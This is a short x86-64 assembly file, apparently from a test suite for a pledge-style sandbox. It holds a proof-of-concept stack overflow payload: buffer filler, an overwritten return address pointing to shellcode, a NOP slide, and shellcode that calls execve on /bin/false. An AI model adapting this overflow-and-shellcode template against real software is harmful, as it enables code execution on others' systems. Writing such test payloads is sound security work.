;
; (c)2025 Ira Parsons
; autopledge test suite - poc-overflow shellcode
;
bits 64
org 0x7fffffffecb0

times 16 db 'A'              ; fill buffer with garbage
times 8  db 'B'              ; overwrite rbp
	 dq _start           ; return address
times 16 nop                 ; nop slide

global _start
_start:
	xor rax, rax
	mov ax, 'se'
	push rax
	mov rax, '/bin/fal'
	push rax
	mov rdi, rsp
	xor rsi, rsi
	mov rdx, rsi
	mov rax, 59
	syscall
